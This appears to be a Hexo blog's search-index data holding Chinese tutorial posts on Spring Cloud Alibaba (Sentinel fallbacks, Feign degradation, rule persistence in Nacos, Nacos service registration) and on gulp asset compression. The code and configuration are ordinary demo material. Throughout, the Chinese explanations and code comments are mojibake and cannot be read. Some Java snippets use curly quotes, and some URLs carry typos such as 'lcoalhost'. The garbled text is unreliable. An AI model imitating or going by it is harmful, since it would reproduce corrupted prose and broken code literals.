&lt;/dependency&gt; &lt;dependency&gt;&lt;!-- å¼•å…¥è‡ªå·±å®šä¹‰çš„apié€šç”¨åŒ…ï¼Œå¯ä»¥ä½¿ç”¨Paymentæ”¯ä»˜Entity --&gt; &lt;groupId&gt;com.atguigu.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- SpringBootæ•´åˆWebç»„ä»¶ --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--æ—¥å¸¸é€šç”¨jaråŒ…é…ç½®--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml server: port: 9003 spring: application: name: nacos-payment-provider cloud: nacos: discovery: server-addr: localhost:8848 #é…ç½®Nacosåœ°å€ management: endpoints: web: exposure: include: &#39;*&#39; è®°å¾—ä¿®æ”¹ä¸åŒçš„ç«¯å£å· ä¸»å¯åŠ¨ package com.atguigu.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @SpringBootApplication @EnableDiscoveryClient public class PaymentMain9003 { public static void main(String[] args) { SpringApplication.run(PaymentMain9003.class, args); } } ä¸šåŠ¡ç±» package com.atguigu.springcloud.alibaba.controller; import com.atguigu.springcloud.alibaba.entities.CommonResult; import com.atguigu.springcloud.alibaba.entities.Payment; import org.springframework.beans.factory.annotation.Value; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.RestController; import java.util.HashMap; @RestController public class PaymentController { @Value(&quot;${server.port}&quot;) private String serverPort; public static HashMap&lt;Long, Payment&gt; hashMap = new HashMap&lt;&gt;(); static{ hashMap.put(1L,new Payment(1L,&quot;28a8c1e3bc2742d8848569891fb42181&quot;)); hashMap.put(2L,new Payment(2L,&quot;bba8c1e3bc2742d8848569891ac32182&quot;)); hashMap.put(3L,new Payment(3L,&quot;6ua8c1e3bc2742d8848569891xt92183&quot;)); } @GetMapping(value = &quot;/paymentSQL/{id}&quot;) public CommonResult&lt;Payment&gt; paymentSQL(@PathVariable(&quot;id&quot;) Long id){ Payment payment = hashMap.get(id); CommonResult&lt;Payment&gt; result = new CommonResult(200,&quot;from mysql,serverPort: &quot;+serverPort,payment); return result; } } æµ‹è¯•åœ°å€ http://localhost:9003/paymentSQL/1 æ¶ˆè´¹è€…84 æ–°å»ºcloudalibaba-consumer-nacos-order84 POM &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.atguigu.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; YML server: port: 84 spring: application: name: nacos-order-consumer cloud: nacos: discovery: server-addr: localhost:8848 sentinel: transport: dashboard: localhost:8080 port: 8719 service-url: nacos-user-service: http://nacos-payment-provider ä¸»å¯åŠ¨ package com.atguigu.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.cloud.openfeign.EnableFeignClients; @EnableDiscoveryClient @SpringBootApplication @EnableFeignClients public class OrderNacosMain84 { public static void main(String[] args) { SpringApplication.run(OrderNacosMain84.class, args); } } ä¸šåŠ¡ç±» ApplicationContextConfig package com.atguigu.springcloud.alibaba.config; import org.springframework.cloud.client.loadbalancer.LoadBalanced; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.client.RestTemplate; @Configuration public class ApplicationContextConfig { @Bean @LoadBalanced public RestTemplate getRestTemplate() { return new RestTemplate(); } } CircleBreakerControllerçš„å…¨éƒ¨æºç  package com.atguigu.springcloud.alibaba.controller; import com.alibaba.csp.sentinel.annotation.SentinelResource; import com.alibaba.csp.sentinel.slots.block.BlockException; import com.atguigu.springcloud.alibaba.entities.CommonResult; import com.atguigu.springcloud.alibaba.entities.Payment; import lombok.extern.slf4j.Slf4j; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.client.RestTemplate; import javax.annotation.Resource; @RestController @Slf4j public class CircleBreakerController { public static final String SERVICE_URL = &quot;http://nacos-payment-provider&quot;; @Resource private RestTemplate restTemplate; @RequestMapping(&quot;/consumer/fallback/{id}&quot;) //@SentinelResource(value = &quot;fallback&quot;) //æ²¡æœ‰é…ç½® //@SentinelResource(value = &quot;fallback&quot;,fallback = &quot;handlerFallback&quot;) //fallbackåªè´Ÿè´£ä¸šåŠ¡å¼‚å¸¸ //@SentinelResource(value = &quot;fallback&quot;,blockHandler = &quot;blockHandler&quot;) //blockHandleråªè´Ÿè´£sentinelæ§åˆ¶å°é…ç½®è¿è§„ @SentinelResource(value = &quot;fallback&quot;,fallback = &quot;handlerFallback&quot;,blockHandler = &quot;blockHandler&quot;, exceptionsToIgnore = {IllegalArgumentException.class}) public CommonResult&lt;Payment&gt; fallback(@PathVariable Long id) { CommonResult&lt;Payment&gt; result = restTemplate.getForObject(SERVICE_URL + &quot;/paymentSQL/&quot;+id, CommonResult.class,id); if (id == 4) { throw new IllegalArgumentException (&quot;IllegalArgumentException,éæ³•å‚æ•°å¼‚å¸¸....&quot;); }else if (result.getData() == null) { throw new NullPointerException (&quot;NullPointerException,è¯¥IDæ²¡æœ‰å¯¹åº”è®°å½•,ç©ºæŒ‡é’ˆå¼‚å¸¸&quot;); } return result; } //fallback public CommonResult handlerFallback(@PathVariable Long id,Throwable e) { Payment payment = new Payment(id,&quot;null&quot;); return new CommonResult&lt;&gt;(444,&quot;å…œåº•å¼‚å¸¸handlerFallback,exceptionå†…å®¹ &quot;+e.getMessage(),payment); } //blockHandler public CommonResult blockHandler(@PathVariable Long id,BlockException blockException) { Payment payment = new Payment(id,&quot;null&quot;); return new CommonResult&lt;&gt;(445,&quot;blockHandler-sentinelé™æµ,æ— æ­¤æµæ°´: blockException &quot;+blockException.getMessage(),payment); } } ä¿®æ”¹åè¯·é‡å¯å¾®æœåŠ¡ çƒ­éƒ¨ç½²å¯¹javaä»£ç çº§ç”Ÿæ•ˆåŠæ—¶ å¯¹@SentinelResourceæ³¨è§£å†…å±æ€§ï¼Œæœ‰æ—¶æ•ˆæœä¸å¥½ ç›®çš„ fallbackç®¡è¿è¡Œå¼‚å¸¸ blockHandlerç®¡é…ç½®è¿è§„ æµ‹è¯•åœ°å€ http://localhost:84/consumer/fallback/1 æ²¡æœ‰ä»»ä½•é…ç½® ç»™å®¢æˆ·erroré¡µé¢ï¼Œä¸å‹å¥½ åªé…ç½®fallback ç¼–ç ï¼ˆé‚£ä¸ªä¸šåŠ¡ç±»ä¸‹é¢çš„CircleBreakerControllerçš„å…¨éƒ¨æºç ï¼‰ åªé…ç½®blockHandler ç¼–ç ï¼ˆé‚£ä¸ªä¸šåŠ¡ç±»ä¸‹é¢çš„CircleBreakerControllerçš„å…¨éƒ¨æºç ï¼‰ fallbackå’ŒblockHandleréƒ½é…ç½® ç»“æœ 1598338239282 å¿½ç•¥å±æ€§â€¦ ç¼–ç ï¼ˆé‚£ä¸ªä¸šåŠ¡ç±»ä¸‹é¢çš„CircleBreakerControllerçš„å…¨éƒ¨æºç ï¼‰ 1598338281914 Feignç³»åˆ—ä¿®æ”¹84æ¨¡å— POM &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; yml server: port: 84 spring: application: name: nacos-order-consumer cloud: nacos: discovery: server-addr: localhost:8848 sentinel: transport: dashboard: localhost:8080 port: 8719 service-url: nacos-user-service: http://nacos-payment-provider #å¯¹Feignçš„æ”¯æŒ feign: sentinel: enabled: true ä¸šåŠ¡ç±» å¸¦@FeignClientæ³¨è§£çš„ä¸šåŠ¡æ¥å£ ```javapackage com.atguigu.springcloud.alibaba.service; import com.atguigu.springcloud.alibaba.entities.CommonResult; import com.atguigu.springcloud.alibaba.entities.Payment; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; @FeignClient(value = â€œnacos-payment-providerâ€,fallback = PaymentFallbackService.class) public interface PaymentService { @GetMapping(value = â€œ/paymentSQL/{id}â€) public CommonResult paymentSQL(@PathVariable(â€œidâ€) Long id); } - fallback = PaymentFallbackService.class - PaymentFallbackServiceå®ç°ç±» ```java package com.atguigu.springcloud.alibaba.service; import com.atguigu.springcloud.alibaba.entities.CommonResult; import com.atguigu.springcloud.alibaba.entities.Payment; import org.springframework.stereotype.Component; @Component public class PaymentFallbackService implements PaymentService { @Override public CommonResult&lt;Payment&gt; paymentSQL(Long id) { return new CommonResult&lt;&gt;(44444,&quot;æœåŠ¡é™çº§è¿”å›,---PaymentFallbackService&quot;,new Payment(id,&quot;errorSerial&quot;)); } } Controller // OpenFeign @Resource private PaymentService paymentService; @GetMapping(value = &quot;/consumer/paymentSQL/{id}&quot;) public CommonResult&lt;Payment&gt; paymentSQL(@PathVariable(&quot;id&quot;) Long id) { return paymentService.paymentSQL(id); } ä¸»å¯åŠ¨ æ·»åŠ @EnableFeignClientså¯åŠ¨Feignçš„åŠŸèƒ½ package com.atguigu.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.cloud.openfeign.EnableFeignClients; @EnableDiscoveryClient @SpringBootApplication @EnableFeignClients public class OrderNacosMain84 { public static void main(String[] args) { SpringApplication.run(OrderNacosMain84.class, args); } } http://lcoalhost:84/consumer/openfeign/1 http://lcoalhost:84/consumer/paymentSQL/1 æµ‹è¯•84è°ƒç”¨9003ï¼Œæ­¤æ—¶æ•…æ„å…³é—­9003å¾®æœåŠ¡æä¾›è€…ï¼Œçœ‹84æ¶ˆè´¹ä¾§è‡ªåŠ¨é™çº§ï¼Œä¸ä¼šè¢«è€—æ­» ç†”æ–­æ¡†æ¶æ¯”è¾ƒ1598339929387 1598339942749 è§„åˆ™æŒä¹…åŒ–æ˜¯ä»€ä¹ˆä¸€æ—¦æˆ‘ä»¬é‡å¯åº”ç”¨ï¼ŒSentinelè§„åˆ™å°†æ¶ˆå¤±ï¼Œç”Ÿäº§ç¯å¢ƒéœ€è¦å°†é…ç½®è§„åˆ™è¿›è¡ŒæŒä¹…åŒ– æ€ä¹ˆç©å°†é™æµé…ç½®è§„åˆ™æŒä¹…åŒ–è¿›Nacosä¿å­˜ï¼Œåªè¦åˆ·æ–°8401æŸä¸ªreståœ°å€ï¼Œsentinelæ§åˆ¶å°çš„æµæ§è§„åˆ™å°±èƒ½çœ‹åˆ°ï¼Œåªè¦Nacosé‡Œé¢çš„é…ç½®ä¸åˆ é™¤ï¼Œé’ˆå¯¹8401ä¸ŠSentinelä¸Šçš„æµæ§è§„åˆ™æŒç»­æœ‰æ•ˆ æ­¥éª¤ä¿®æ”¹cloudalibaba-sentinel-service8401 POM &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-datasource-nacos&lt;/artifactId&gt; &lt;/dependency&gt; YML server: port: 8401 spring: application: name: cloudalibaba-sentinel-service cloud: nacos: discovery: server-addr: localhost:8848 #NacosæœåŠ¡æ³¨å†Œä¸­å¿ƒåœ°å€ sentinel: transport: dashboard: localhost:8080 #é…ç½®Sentinel dashboardåœ°å€ port: 8719 datasource: ds1: nacos: server-addr: localhost:8848 dataId: cloudalibaba-sentinel-service groupId: DEFAULT_GROUP data-type: json rule-type: flow management: endpoints: web: exposure: include: &#39;*&#39; feign: sentinel: enabled: true # æ¿€æ´»Sentinelå¯¹Feignçš„æ”¯æŒ æ·»åŠ Nacosæ•°æ®æºé…ç½® spring: cloud: sentinel: datasource: ds1: nacos: server-addr:localhost:8848 dataid:${spring.application.name} groupid:DEFAULT_GROUP data-type:json rule-type:flow æ·»åŠ Nacosä¸šåŠ¡è§„åˆ™é…ç½® 1598340101146 1598340112967 å†…å®¹è§£æ [ { &quot;resource&quot;: &quot;/retaLimit/byUrl&quot;, &quot;limitApp&quot;: &quot;default&quot;, &quot;grade&quot;: 1, &quot;count&quot;: 1, &quot;strategy&quot;: 0, &quot;controlBehavior&quot;: 0, &quot;clusterMode&quot;: false } ] 1598340151536 å¯åŠ¨8401ååˆ·æ–°sentinelå‘ç°ä¸šåŠ¡è§„åˆ™æœ‰äº† 1598340340265 å¿«é€Ÿè®¿é—®æµ‹è¯•æ¥å£ http://localhost:8401/rateLimit/byUrl é»˜è®¤ å›¾åƒ åœæ­¢8401å†çœ‹sentinel 1598340454693 é‡æ–°å¯åŠ¨8401å†çœ‹sentinel: æ‰ä¸€çœ‹è¿˜æ˜¯æ²¡æœ‰ï¼Œç¨ç­‰ä¸€ä¼šå„¿ å¤šæ¬¡è°ƒç”¨ http://localhost:8401/rateLimit/byUrl é‡æ–°é…ç½®å‡ºç°äº†ï¼ŒæŒä¹…åŒ–éªŒè¯é€šè¿‡","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"gulpå‹ç¼©é™æ€èµ„æº","slug":"gulpå‹ç¼©é™æ€èµ„æº","date":"2020-08-23T19:28:18.000Z","updated":"2021-04-11T17:11:28.502Z","comments":true,"path":"gulpå‹ç¼©é™æ€èµ„æº/","link":"","permalink":"https://blog.kayleh.top/gulp%E5%8E%8B%E7%BC%A9%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90/","excerpt":"hexo","text":"hexo GulpåŸºäºNode.jsçš„å‰ç«¯æ„å»ºå·¥å…·ï¼Œé€šè¿‡Gulpçš„æ’ä»¶å¯ä»¥å®ç°å‰ç«¯ä»£ç çš„ç¼–è¯‘ï¼ˆsassã€lessï¼‰ã€å‹ç¼©ã€æµ‹è¯•ï¼›å›¾ç‰‡çš„å‹ç¼©ï¼›æµè§ˆå™¨è‡ªåŠ¨åˆ·æ–°; å®‰è£…ä¾èµ–åœ¨æ ¹ç›®å½•ä¸‹:npm install gulp --save npm install gulp-minify-css --save npm install gulp-uglify --save npm install gulp-htmlmin --save npm install gulp-htmlclean --save npm install gulp-imagemin --save åˆ›å»ºæ–‡ä»¶gulpfile.js:// å¼•å…¥éœ€è¦çš„æ¨¡å— var gulp = require(&#39;gulp&#39;); var minifycss = require(&#39;gulp-minify-css&#39;); var uglify = require(&#39;gulp-uglify&#39;); var htmlmin = require(&#39;gulp-htmlmin&#39;); var htmlclean = require(&#39;gulp-htmlclean&#39;); var imagemin = require(&#39;gulp-imagemin&#39;); // å‹ç¼©publicç›®å½•ä¸‹æ‰€æœ‰htmlæ–‡ä»¶, minify-htmlæ˜¯ä»»åŠ¡å, è®¾ç½®ä¸ºdefaultï¼Œå¯åŠ¨gulpå‹ç¼©çš„æ—¶å€™å¯ä»¥çœå»ä»»åŠ¡å gulp.task(&#39;minify-html&#39;, function() { return gulp.src(&#39;./public/**/*.html&#39;) // å‹ç¼©æ–‡ä»¶æ‰€åœ¨çš„ç›®å½• .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest(&#39;./public&#39;)) // è¾“å‡ºçš„ç›®å½• }); // å‹ç¼©css gulp.task(&#39;minify-css&#39;, function() { return gulp.src(&#39;./public/**/*.css&#39;) .pipe(minifycss({ compatibility: &#39;ie8&#39; })) .pipe(gulp.dest(&#39;./public&#39;)); }); // å‹ç¼©js gulp.task(&#39;minify-js&#39;, function() { return gulp.src([&#39;./public/**/.js&#39;,&#39;!./public/js/**/*min.js&#39;]) .pipe(uglify()) .pipe(gulp.dest(&#39;./public&#39;)); }); // å‹ç¼©å›¾ç‰‡ gulp.task(&#39;minify-images&#39;, function() { return gulp.src([&#39;./public/**/*.png&#39;,&#39;./public/**/*.jpg&#39;,&#39;./public/**/*.gif&#39;]) .pipe(imagemin( [imagemin.gifsicle({&#39;optimizationLevel&#39;: 3}), //imagemin.mozjpeg({&#39;progressive&#39;: true}), imagemin.jpegtran({&#39;progressive&#39;: true}), imagemin.optipng({&#39;optimizationLevel&#39;: 7}), imagemin.svgo()], {&#39;verbose&#39;: true})) .pipe(gulp.dest(&#39;./public&#39;)) }); // gulp 4.0 é€‚ç”¨çš„æ–¹å¼ gulp.task(&#39;default&#39;, gulp.parallel(&#39;minify-html&#39;,&#39;minify-css&#39;,&#39;minify-js&#39;,&#39;minify-images&#39; //build the website )); è¿è¡Œ hexo clean &amp;&amp; hexo g &amp;&amp; gulp default &amp;&amp; hexo s å®Œæˆå¯¹é™æ€èµ„æºçš„å‹ç¼©ã€‚ æ³¨æ„ï¼šå‹ç¼©é™æ€èµ„æºæ—¶ï¼ŒCPUå ç”¨ç‡ä¼šå¾ˆé«˜ã€‚ å¦‚æœå‡ºç°ä¸€ä¸‹é”™è¯¯ï¼š TypeError: imagemin.jpegtran is not a function at D:\\Blog\\gulpfile.js:41:18 at minify-images (D:\\Blog\\node_modules\\undertaker\\lib\\set-task.js:13:15) at bound (domain.js:419:14) at runBound (domain.js:432:12) at asyncRunner (D:\\Blog\\node_modules\\async-done\\index.js:55:18) at processTicksAndRejections (internal/process/task_queues.js:76:11) ä¿®æ”¹æ–‡ä»¶gulpfile.js imagemin.jpegtran({&#39;progressive&#39;: true}) ä¿®æ”¹ä¸º imagemin.mozjpeg({&#39;progressive&#39;: true})","categories":[],"tags":[{"name":"front","slug":"front","permalink":"https://blog.kayleh.top/tags/front/"}]},{"title":"NacosæœåŠ¡æ³¨å†Œå’Œé…ç½®ä¸­å¿ƒ","slug":"NacosæœåŠ¡æ³¨å†Œå’Œé…ç½®ä¸­å¿ƒ","date":"2020-08-21T01:44:55.000Z","updated":"2021-04-11T17:11:28.341Z","comments":true,"path":"NacosæœåŠ¡æ³¨å†Œå’Œé…ç½®ä¸­å¿ƒ/","link":"","permalink":"https://blog.kayleh.top/Nacos%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83/","excerpt":"Nacos","text":"Nacos ä¸€ä¸ªæ›´æ˜“äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ï¼Œé…ç½®ç®¡ç†å’ŒæœåŠ¡ç®¡ç†ä¸­å¿ƒ Nacosï¼šDynamic Naming and Configuration Service Nacoså°±æ˜¯æ³¨å†Œä¸­å¿ƒ+é…ç½®ä¸­å¿ƒçš„ç»„åˆç­‰ä»·äº Nacos = Eureka+Config+Bus èƒ½å¹²å˜› æ›¿ä»£EurekaåšæœåŠ¡æ³¨å†Œä¸­å¿ƒ æ›¿ä»£ConfigåšæœåŠ¡é…ç½®ä¸­å¿ƒ https://github.com/alibaba/Nacos https://nacos.io/zh-cn/index.html https://spring-cloud-alibaba-group.github.io/github-pages/greenwich/spring-cloud-alibaba.html#_spring_cloud_alibaba_nacos_discovery å„ç§æ³¨å†Œä¸­å¿ƒæ¯”è¾ƒ 1597916860197 å®‰è£…å¹¶è¿è¡ŒNacos1æœ¬åœ°Java8+Mavenç¯å¢ƒå·²ç»OK 2å…ˆä»å®˜ç½‘ä¸‹è½½Nacos https://github.com/alibaba/nacos/releases/tag/1.1.4 3è§£å‹å®‰è£…åŒ…ï¼Œç›´æ¥è¿è¡Œbinç›®å½•ä¸‹çš„startup.cmd 4å‘½ä»¤è¿è¡ŒæˆåŠŸåç›´æ¥è®¿é—® http://localhost:8848/nacos é»˜è®¤è´¦å·å¯†ç éƒ½æ˜¯nacos ç»“æœé¡µé¢ 1597916943447 Nacosä½œä¸ºæœåŠ¡æ³¨å†Œä¸­å¿ƒæ¼”ç¤ºåŸºäºNacosçš„æœåŠ¡æä¾›è€…æ–°å»ºModule cloudalibaba-provider-payment9001 çˆ¶POM &lt;!--spring cloud alibaba 2.1.0.RELEASE--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt; &lt;version&gt;2.1.0.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; æœ¬æ¨¡å—POM &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.62&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yaml server: port: 9001 spring: application: name: nacos-payment-provider cloud: nacos: discovery: server-addr: localhost:8848 #é…ç½®Nacosåœ°å€ management: endpoints: web: exposure: include: &#39;*&#39; ä¸»å¯åŠ¨ç±» package com.kayleh.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @EnableDiscoveryClient @SpringBootApplication public class PaymentMain9001 { public static void main(String[] args) { SpringApplication.run(PaymentMain9001.class,args); } } ä¸šåŠ¡ç±» package com.kayleh.springcloud.alibaba.controller; import org.springframework.beans.factory.annotation.Value; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.RestController; @RestController public class PaymentController { @Value(&quot;${server.port}&quot;) private String serverPort; @GetMapping(value = &quot;/payment/nacos/{id}&quot;) public String getPayment(@PathVariable(&quot;id&quot;) Integer id) { return &quot;nacos registry, serverPort: &quot;+ serverPort+&quot;\\t id&quot;+id; } } æµ‹è¯• http://localhost:9001/payment/nacos/1 nacosæ§åˆ¶å° 1597917114444 nacosæœåŠ¡æ³¨å†Œä¸­å¿ƒ+æœåŠ¡æä¾›è€…9001éƒ½okäº† ä¸ºäº†æ¼”ç¤ºnacosçš„è´Ÿè½½å‡è¡¡ï¼Œå‚ç…§9001æ–°å»º9002 æ–°å»º cloudalibaba-provider-payment9002 9002å…¶ä»–æ­¥éª¤ä½ æ‡‚çš„ æˆ–è€…å–å·§ä¸æƒ³æ–°å»ºé‡å¤ä½“åŠ›åŠ³åŠ¨ï¼Œç›´æ¥æ‹·è´è™šæ‹Ÿç«¯å£æ˜ å°„ 1597917265960 1597917272302\" style=\"zoom: 80%; åŸºäºNacosçš„æœåŠ¡æ¶ˆè´¹è€…æ–°å»ºModule cloudalibaba-consumer-nacos-order83 POM &lt;dependencies&gt; &lt;!--SpringCloud ailibaba nacos --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; ä¸ºä»€ä¹ˆnacosæ”¯æŒè´Ÿè½½å‡è¡¡ 1597917355359 yaml server: port: 83 spring: application: name: nacos-order-consumer cloud: nacos: discovery: server-addr: localhost:8848 service-url: nacos-user-service: http://nacos-payment-provider ä¸»å¯åŠ¨ package com.kayleh.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @EnableDiscoveryClient @SpringBootApplication public class OrderNacosMain83 { public static void main(String[] args) { SpringApplication.run(OrderNacosMain83.class,args); } } ä¸šåŠ¡ç±» ApplicationContextBean package com.kayleh.springcloud.alibaba.config; import org.springframework.cloud.client.loadbalancer.LoadBalanced; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.client.RestTemplate; @Configuration public class ApplicationContextConfig { @Bean @LoadBalanced public RestTemplate getRestTemplate() { return new RestTemplate(); } } OrderNacosController package com.kayleh.springcloud.alibaba.controller; import lombok.extern.slf4j.Slf4j; import org.springframework.beans.factory.annotation.Value; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.client.RestTemplate; import javax.annotation.Resource; @RestController @Slf4j public class OrderNacosController { @Resource private RestTemplate restTemplate; 